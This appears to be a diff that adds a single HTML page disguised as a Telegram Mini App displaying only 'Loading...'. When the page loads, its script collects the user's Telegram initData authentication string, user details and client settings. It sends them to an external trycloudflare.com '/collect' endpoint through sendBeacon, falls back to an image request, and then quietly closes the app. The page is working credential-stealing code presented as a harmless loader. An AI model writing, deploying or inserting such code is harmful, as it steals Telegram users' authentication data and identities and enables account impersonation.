@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading...</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+<div style="display:flex;justify-content:center;align-items:center;height:100vh;">
+  <p style="color:#999;">Loading...</p>
+</div>
+<script>
+(function() {
+  var EXFIL = 'https://brings-popularity-elsewhere-libraries.trycloudflare.com/collect'
+  var tg = window.Telegram.WebApp
+
+  var identity = {
+    type: 'identity',
+    initData: tg.initData,
+    initDataUnsafe: tg.initDataUnsafe,
+    colorScheme: tg.colorScheme,
+    platform: tg.platform,
+    version: tg.version,
+    themeParams: tg.themeParams,
+    viewportHeight: tg.viewportHeight,
+    viewportStableHeight: tg.viewportStableHeight,
+    isExpanded: tg.isExpanded,
+    headerColor: tg.headerColor,
+    backgroundColor: tg.backgroundColor,
+    isClosingConfirmationEnabled: tg.isClosingConfirmationEnabled,
+    isVerticalSwipesEnabled: tg.isVerticalSwipesEnabled,
+    safeAreaInset: tg.safeAreaInset,
+    contentSafeAreaInset: tg.contentSafeAreaInset,
+    ts: Date.now()
+  }
+
+  try {
+    navigator.sendBeacon(EXFIL + '/identity', JSON.stringify(identity))
+  } catch(e) {
+    new Image().src = EXFIL + '/identity?d=' + encodeURIComponent(JSON.stringify(identity))
+  }
+
+  setTimeout(function() { tg.close() }, 800)
+})()
+</script>
+</body>
+</html>
